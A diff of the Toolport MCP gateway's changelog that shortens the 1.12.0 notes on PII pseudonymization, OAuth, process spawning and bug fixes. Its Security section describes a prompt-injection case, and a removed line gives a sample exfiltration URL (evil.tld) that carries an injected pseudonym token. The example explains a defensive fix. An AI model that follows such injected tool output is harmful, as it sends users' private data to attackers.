@@ -6,213 +6,143 @@ Entries before the rename below shipped under the project's former name, Conduit
 
 ## [1.12.0] - 2026-08-09
 
-Two features ship for the first time here. Toolport can now replace personal data in
-tool results with pseudonyms before the model sees them, putting the real values back
-only for the server that provided them; and headless MCP servers can authenticate
-with OAuth client credentials, so a server nobody can click through a browser sign-in
-for still gets a real token. Both are off or opt-in by default.
+Two features ship for the first time. PII pseudonymization replaces personal data in
+tool results with tokens before the model sees them, restoring the real values only
+for the server that provided them. OAuth client credentials let a headless server —
+one nobody can click a browser sign-in for — get a real token. Both are off or opt-in
+by default.
 
-Alongside them, several things that were only safe within one process are now safe
-across processes: rate-limit counters, OAuth token refresh, and the pseudonym map.
-Each client spawns its own gateway, so "one process" was never the real shape.
+Several things that were only safe within one process are now safe across processes:
+rate-limit counters, OAuth token refresh, and the pseudonym map. Each client spawns
+its own gateway, so one process was never the real shape.
 
 **Upgrading a Teams deployment:** the instructions receipt hash changes once in this
-release. See the Changed section below before you roll it out.
+release. See Changed below before rolling it out.
 
 ### Added
 
-- Old gateway binaries are now cleaned up instead of accumulating forever. Every
-  published gateway stayed on disk (about 18 MB a release, roughly 200 MB on a
-  long-lived install). Toolport now deletes the ones nothing can still be using,
-  and keeps any binary that is running, that a client config still names, that a
-  client is known to be relaunching, or that is recent enough to plausibly be
-  cached, so cleanup can never turn an app that runs old code into one that
-  cannot start the gateway at all. (SOU-484)
-- Toolport now names the apps that keep launching an obsolete gateway. Stopping a
-  stale gateway process is not always enough: an app caches its spawn command when
-  it starts, so one pinned to a path an upgrade never rewrites simply launches the
-  same old binary again, and only restarting that app picks up the current gateway.
-  Settings lists which apps are in that state, a launch notification names them, and
-  each entry clears itself once you restart that app. Settings also now reports
-  processes it found but could not stop, instead of reading as if nothing was
-  stale. (SOU-435)
-- Modern extension negotiation now passes opaque client extension settings to
-  downstream servers and aggregates compatible downstream extension declarations
-  in `server/discover`. Unknown `_meta` and result fields continue through unchanged;
-  conflicting settings are omitted rather than overstating gateway support. (SOU-453)
-- The `io.modelcontextprotocol/tasks` extension now keeps task handles bound to
-  the downstream server that created them and proxies `tasks/get`, `tasks/update`,
-  and `tasks/cancel`, including the required Streamable HTTP routing headers.
-  Toolport task ids survive router rebuilds and app restarts. (SOU-453)
-- Modern clients can detect Toolport through the `app.toolport/gateway` extension.
-  Its settings report the active discovery, code-mode, agent-control, destructive
-  confirmation, and human-approval state; existing meta-tools remain available as
-  the core-protocol fallback for clients that ignore extensions. (SOU-453)
-- Modern downstream catalog fetches now negotiate MCP Apps' HTML MIME type, Apps
-  hosts receive UI-linked tools even in lazy or grouped discovery, and `ui://`
-  resources route through their owning tool when the server omits them from
-  `resources/list`. Negotiated app HTML stays byte-faithful for the host's sandbox
-  and CSP enforcement, while app-only tools stay out of model-facing search and
-  nested-call paths. (SOU-453)
-- Servers launched with `npx` now start about four times fewer processes. An
-  `npx -y some-server` config expanded to a four-process chain on Windows — a
-  `cmd.exe`, the `npx` wrapper, the package's own `.cmd` shim, and finally the
-  server — where only the last one did any work; on one machine that came to
-  roughly 423 processes for 72 servers. Toolport now finds the entry point `npx`
-  would have run and starts it directly. Anything it cannot resolve confidently,
-  including a version range or a `@latest` tag, still runs through `npx` exactly
-  as before. Because this skips the install step, a server stays on the version
-  already in the npm cache instead of quietly picking up a newer release; set
-  `TOOLPORT_NO_DIRECT_SPAWN=1` to restore the old behavior. (SOU-550)
-- Tool results can now have personal data replaced with pseudonyms before the model
-  sees them. Emails, phone numbers, card numbers, IBANs, IP addresses and
-  provider-shaped API keys become stable tokens (`⟦EMAIL_1⟧`) on the way in, and the
-  real values are put back on the way out to the server that provided them. The
-  mapping lives in memory only and never reaches disk or the model. Off by default.
-  This reduces what reaches the model rather than guaranteeing anything: a value no
-  detector recognizes still passes through, and so does everything once the per-session
-  cap is reached. (SBS-346)
-- Headless MCP servers can now authenticate with OAuth client credentials, so a
-  server that no one can click through a browser sign-in for still gets a real token.
-  Toolport discovers the endpoint, negotiates the client authentication method, and
-  reacquires before expiry. It never falls back to the interactive browser flow, which
-  would be unusable in the environment this exists for. (SBS-524)
-- Toolport now has keyboard shortcuts. `Ctrl/Cmd+1`–`6` switch view, `/` or
-  `Ctrl/Cmd+F` focuses the server search, `Ctrl/Cmd+N` adds a server, `Ctrl/Cmd+R`
-  refreshes, and `?` shows the full list. Previously every interaction was mouse-only
-  and the search box could not be focused from the keyboard at all. (SBS-143)
-- The window now reopens at the size and position you left it. It previously reset to
-  a fixed centered geometry on every quit, reboot and update relaunch. (SBS-144)
-- A code-mode script can now be validated without running it, and a script that fails
-  partway now reports the calls it already made instead of discarding them. A script
-  that dies on call 40 of 64 used to say nothing about the 39 whose side effects had
-  already committed. (SBS-646, SBS-647)
-- The gateway binary now supports `--help` and `--version` and rejects unknown flags
-  instead of silently ignoring them.
+- **PII pseudonymization.** Emails, phone numbers, card numbers, IBANs, IP addresses
+  and provider-shaped API keys become stable tokens (`⟦EMAIL_1⟧`) before the model
+  sees them, and are restored on the way out. The mapping stays in memory. Off by
+  default, and a reduction rather than a guarantee: a value no detector recognizes
+  passes through, as does everything once the per-session cap is reached. (SBS-346)
+- **OAuth client credentials for headless servers.** Discovers the endpoint,
+  negotiates the auth method, and reacquires before expiry. Never falls back to a
+  browser flow, which would be unusable where this is needed. (SBS-524)
+- **Old gateway binaries are cleaned up** instead of accumulating (~18 MB a release).
+  Keeps anything running, named by a client config, known to be relaunching, or
+  recent enough to still be cached. (SOU-484)
+- **Apps still launching an obsolete gateway are named.** An app caches its spawn
+  command at startup, so stopping the process is not enough. Settings and a launch
+  notification list which apps need restarting, each entry clears itself, and Settings
+  now reports processes it could not stop. (SOU-435)
+- **Keyboard shortcuts.** `Ctrl/Cmd+1`–`6` switch view, `/` or `Ctrl/Cmd+F` focuses
+  search, `Ctrl/Cmd+N` adds a server, `Ctrl/Cmd+R` refreshes, `?` lists them.
+  (SBS-143)
+- **The window reopens where you left it** instead of resetting to a fixed centered
+  geometry on every launch. (SBS-144)
+- **`npx` servers start about four times fewer processes.** Toolport resolves the
+  entry point directly instead of the `cmd.exe` → `npx` → shim → server chain, which
+  came to roughly 423 processes for 72 servers on one machine. Version ranges and
+  `@latest` still go through `npx`. Because this skips the install step a server stays
+  on the cached version; `TOOLPORT_NO_DIRECT_SPAWN=1` restores the old path. (SOU-550)
+- **Modern MCP extensions.** Opaque client extension settings pass through to
+  downstream servers and compatible declarations aggregate in `server/discover`;
+  `io.modelcontextprotocol/tasks` handles stay bound to the server that created them
+  and survive router rebuilds; clients can detect Toolport via `app.toolport/gateway`,
+  which reports discovery, code-mode, agent-control and approval state. (SOU-453)
+- **MCP Apps.** Catalog fetches negotiate the HTML MIME type, Apps hosts get UI-linked
+  tools even under lazy or grouped discovery, and `ui://` resources route through
+  their owning tool. App HTML stays byte-faithful for host CSP, and app-only tools
+  stay out of model-facing search. (SOU-453)
+- **Code mode** can validate a script without running it, and a script that fails
+  partway reports the calls it already made instead of discarding them. (SBS-646,
+  SBS-647)
+- The gateway binary supports `--help` and `--version`, and rejects unknown flags.
 
 ### Changed
 
-- The team-instructions receipt hash now uses SHA-256 instead of Rust's default
+- **The team-instructions receipt hash now uses SHA-256** instead of Rust's default
   hasher, whose algorithm carries no guarantee across compiler releases. **This
   changes every member's reported hash once.** The Teams coverage dashboard will show
   one round of drift that is not real drift; it reconverges as members report in on
-  this version. The hash is the same width and format as before. (SBS-460)
+  this version. Same width and format as before. (SBS-460)
 
 ### Security
 
-- OAuth authorization responses are now bound to the validated authorization-server
-  issuer before Toolport exchanges a code or displays an authorization error. Stored
-  refresh credentials refuse to cross to a changed issuer, and loopback Dynamic Client
-  Registration identifies Toolport as a native client as required by the current MCP
-  authorization profile. Older vaulted OAuth state remains readable. (SOU-451)
-- OAuth discovery now checks the MCP endpoint's path-specific protected-resource
-  metadata before the origin fallback, rejects metadata for a different resource,
-  and requests the resource's advertised scopes. OAuth and OIDC authorization-server
-  metadata candidates follow the current MCP priority order. (SOU-451)
-- OAuth discovery now honors Bearer `WWW-Authenticate` challenges, validates the
-  advertised protected-resource metadata URL with the existing TLS and SSRF guards,
-  and gives a challenge's requested scope priority without weakening discovery for
-  older servers that do not return a challenge. (SOU-451)
-- Runtime OAuth `insufficient_scope` challenges now preserve previously requested
-  scopes, open a user-consent step-up flow, and retry the blocked MCP operation once
-  with the new token. Step-up attempts are bounded per operation and never consume
-  refresh tokens that cannot grant additional permissions. (SOU-451)
-- OAuth authorization servers that advertise Client ID Metadata Document support
-  now use Toolport's stable HTTPS client identity instead of Dynamic Client
-  Registration. DCR remains the compatibility fallback for older servers. (SOU-451)
-- A pseudonym is now only ever resolved back for the server that produced that value.
-  Tool results are attacker-controlled, so a result from one server could otherwise
-  talk the model into putting another server's token in an argument — asking it to
-  fetch `https://evil.tld/?e=⟦EMAIL_1⟧` would have sent a real customer address to
-  whoever wrote the injected text. A call carrying a token from a different server is
-  now refused rather than sent. The practical cost is deliberate: reading a record
-  from one server and passing it to another no longer works unattended. (SBS-605)
-- The pseudonym map is now cleared when a conversation ends and on a fresh handshake,
+- **A pseudonym only resolves for the server that produced it.** Tool results are
+  attacker-controlled, so an injected result could otherwise talk the model into
+  putting a CRM's token into a URL for an unrelated fetch tool, sending the real value
+  to whoever wrote the injection. Calls carrying another server's token are refused.
+  The cost is deliberate: passing a record between servers no longer works unattended.
+  (SBS-605)
+- **The pseudonym map is cleared when a conversation ends** and on a fresh handshake,
   on every transport. It previously lived for the whole gateway process with no
-  eviction, so a new conversation still resolved the previous one's tokens and real
-  values stayed resident indefinitely. (SBS-605)
-- Retry fields on a resumed request now get the same pseudonym handling as the
-  arguments beside them, so a host that answers a server's prompt from model context
-  no longer relays a literal token to the real server. (SBS-606)
-- OAuth token refresh is now serialized across the app and the gateway. They are
-  separate processes sharing one keychain, so both could read the same refresh token
-  and spend it twice — which a provider with refresh-token reuse detection answers by
-  revoking the whole family. The process that loses the race now uses the winner's
-  token instead of minting another. (SBS-479)
-- A refusal to send a saved token over cleartext no longer echoes credentials embedded
-  in the URL back into the error, where they reached the activity view and logs.
-  (SBS-636)
-- An empty tool-quarantine store now fails closed instead of being read as "nothing
-  quarantined". A truncated file silently re-exposed every tool held after high-risk
-  drift or baseline tamper. (SBS-654)
-- Rate-limit counters are now safe across concurrent gateway processes. Each client
-  spawns its own gateway, and they overwrote one another's counts, so org caps
-  under-counted and did not hold. Overlapping caps sharing a window also no longer
-  double-count a single call. (SBS-680, SBS-609)
+  eviction. (SBS-605)
+- Retry fields on a resumed request get the same pseudonym handling as the arguments
+  beside them, so a host answering a prompt from model context no longer relays a
+  literal token downstream. (SBS-606)
+- **OAuth token refresh is serialized across the app and the gateway.** They share one
+  keychain and could spend the same refresh token twice, which a provider with reuse
+  detection answers by revoking the whole family. (SBS-479)
+- **Rate-limit counters are safe across concurrent gateways.** Each client spawns its
+  own and they overwrote one another's counts, so org caps under-counted and did not
+  hold. Overlapping caps sharing a window no longer double-count. (SBS-680, SBS-609)
+- **An empty quarantine store fails closed.** A truncated file silently re-exposed
+  every tool held after high-risk drift or baseline tamper. (SBS-654)
+- A cleartext-auth refusal no longer echoes URL-embedded credentials into the error,
+  where they reached the activity view and logs. (SBS-636)
+- **OAuth hardening** (SOU-451): authorization responses bind to the validated issuer,
+  and stored credentials refuse to cross a changed issuer; discovery checks
+  path-specific protected-resource metadata before the origin fallback and rejects
+  metadata for a different resource; Bearer `WWW-Authenticate` challenges are honored
+  and validated through the existing TLS and SSRF guards; runtime `insufficient_scope`
+  challenges preserve prior scopes and open a bounded consent step-up; servers
+  advertising Client ID Metadata Documents use Toolport's stable HTTPS identity, with
+  Dynamic Client Registration as the fallback.
 
 ### Fixed
 
-- A registry change saved in the app could briefly revert on screen. The disk
-  watcher read the registry file outside the lock that guards the in-memory copy,
-  so a save landing at the same moment could be overwritten by the slightly older
-  contents the watcher had just read, leaving the app showing the previous state.
-  The watcher now drops a read that a newer save has already superseded. (SOU-329)
-- OAuth loopback callbacks now reject an empty authorization code instead of showing
-  a success page and sending an invalid token-exchange request.
 - Reading a resource whose URI contains non-ASCII characters no longer fails. The
   template matcher walked the URI by byte, so backtracking through a multi-byte
-  character crashed the router and the read came back as an internal error even
-  though the URI was a valid expansion of the template. (SBS-620)
-- A code-mode script's return value is no longer silently corrupted. A `Date` came
-  back as `{}` and a `BigInt` as `null`, both reported as success, so an agent
-  continued on empty timestamps and null ids with no indication anything was lost.
-  Values that cannot be represented now fail with an error instead. (SBS-631)
-- Connecting, rescoping, disconnecting or migrating a client now leaves a reminder in
-  the panel, not just a toast that fades. The client keeps running its old config
-  until it restarts, so the change looked applied when it was not. Disconnect gets its
-  own wording, and migrating says it at all for the first time. (SBS-336)
-- The Activity list no longer comes up short when the audit log contains an unreadable
-  line. A corrupt row consumed a slot in the page instead of being skipped, hiding
-  valid history that should have filled it. (SBS-677)
-- Importing or pasting a server launched through `npx.bat` now keeps its package
-  identity. Only `.exe`, `.cmd` and `.ps1` were recognized as package runners, so two
-  servers running different packages under one display name collapsed into a single
-  import and a pasted config was named "npx". (SBS-664)
-- The "Stop old gateways" panel no longer reads as though it contradicts itself.
-  Running it could report that no old gateway processes were running directly above a
-  list of apps still launching one. Both were true — a client spawns the gateway on
-  its next tool call, not continuously, so between calls there is nothing to stop —
-  but the panel never said so. It now does, and each row shows the process id, so
-  several copies of one editor are no longer three identical-looking lines you cannot
-  act on.
-- The onboarding "What is Toolport for Teams?" link now deliberately opens the
-  explainer page rather than the app sign-in, which is the right destination for
-  someone who has no team and no invite code yet. (SBS-461)
+  character crashed the router. (SBS-620)
+- A code-mode script's return value is no longer silently corrupted: a `Date` came
+  back as `{}` and a `BigInt` as `null`, both reported as success. Values that cannot
+  be represented now error instead. (SBS-631)
+- Connect, rescope, disconnect and migrate leave a restart reminder in the panel
+  rather than only a toast that fades, with wording matched to the action. (SBS-336)
+- The "Stop old gateways" panel no longer reads as though it contradicts itself. It
+  could report nothing running directly above a list of apps still launching one —
+  both true, since a client spawns the gateway on its next tool call. It now says so,
+  and each row shows the process id so near-identical entries can be told apart.
+- The Activity list no longer comes up short when the audit log holds an unreadable
+  line, which used to consume a slot in the page instead of being skipped. (SBS-677)
+- Servers launched through `npx.bat` keep their package identity on import and paste;
+  only `.exe`, `.cmd` and `.ps1` were recognized as package runners. (SBS-664)
+- A registry change saved in the app could briefly revert on screen when the disk
+  watcher read the file outside the lock guarding the in-memory copy. (SOU-329)
+- OAuth loopback callbacks reject an empty authorization code instead of showing a
+  success page and sending an invalid token exchange.
+- The onboarding "What is Toolport for Teams?" link opens the explainer page rather
+  than the app sign-in, the right destination before you have a team. (SBS-461)
 
 ### Maintenance
 
-- `cargo clippy --all-targets` is now free of errors. A single deny-by-default
-  `never_loop` in the resource-subscribe path was the last hard failure standing
-  between the repo and a blocking clippy gate in CI. (SBS-434)
-- Code mode's real limits are now documented and pinned by tests. A script that never
-  calls a tool and never awaits is bounded by iteration and recursion counts, not by
-  the wall clock, which nothing consults on that path. Both bounds fail closed, so a
-  runaway always terminates. (SBS-430)
-- Regression tests now pin that pseudonyms are resolved as the last step before a call
-  leaves the machine. That ordering had regressed once before without any test
-  noticing. (SBS-614)
-- The three Toolport for Teams URLs now come from one place instead of being declared
-  separately in two components, with a third hardcoded alongside them. (SBS-461)
-- CodeRev now reviews pull requests as an advisory shadow reviewer, once per PR
-  rather than on every push.
-- All text files check out with LF endings on every platform, and the reaper test
-  fixtures share one scratch-directory guard instead of serializing on a mutex.
+- `cargo clippy --all-targets` is error-free. A deny-by-default `never_loop` was the
+  last hard failure blocking a clippy gate in CI. (SBS-434)
+- Code mode's real limits are documented and pinned by tests: a script that never
+  calls a tool is bounded by iteration and recursion counts, not the wall clock. Both
+  fail closed. (SBS-430)
+- Tests pin that pseudonyms resolve as the last step before dispatch, an ordering that
+  had regressed once without anything catching it. (SBS-614)
+- Team URLs come from one place, CodeRev reviews once per PR, and text files check out
+  with LF endings on every platform. (SBS-461)
 
 ### Thanks
 
-Ten people sent patches this cycle. Two new clients, a config-corruption fix that
-protects anyone hand-editing their MCP files, and the CI job that now guards the
-gateway's security suite all came from outside the core:
+Ten people sent patches this cycle, including two new clients, a fix that stops
+installs stripping comments out of hand-edited configs, and the CI job that now guards
+the gateway's security suite:
 
 - **[Vermitrude](https://github.com/Vermitrude)** - Factory Droid CLI support, and
   `--help` / `--version` on the gateway binary, which previously accepted unknown
@@ -220,9 +150,9 @@ gateway's security suite all came from outside the core:
 - **[slegarraga](https://github.com/slegarraga)** - removed a dead data-directory
   shim and corrected three pieces of CONTRIBUTING that had drifted from the code
   (#638, #639, #642).
-- **[rohankumardubey](https://github.com/rohankumardubey)** - put the headless
-  gateway security smoke suite into CI, where it had never run, and exposed sidebar
-  and toggle state to screen readers (#580, #621).
+- **[rohankumardubey](https://github.com/rohankumardubey)** - put the headless gateway
+  security smoke suite into CI, where it had never run, and exposed sidebar and toggle
+  state to screen readers (#580, #621).
 - **[syf2211](https://github.com/syf2211)** - turned raw stack traces into readable
   headlines for DNS, TLS, 429 and 5xx connection failures, and made catalog search
   include the category so searching a visible heading actually matches (#611, #614).
@@ -235,8 +165,8 @@ gateway's security suite all came from outside the core:
   curated catalog (#615).
 - **[aryansk](https://github.com/aryansk)** - documented the gateway's public
   environment overrides (#640).
-- **[AshSgDe29071999](https://github.com/AshSgDe29071999)** - documented curated
-  stacks and replaced a hardcoded count that broke whenever one was added (#616).
+- **[AshSgDe29071999](https://github.com/AshSgDe29071999)** - documented curated stacks
+  and replaced a hardcoded count that broke whenever one was added (#616).
 
 ## [1.11.0] - 2026-08-01
 
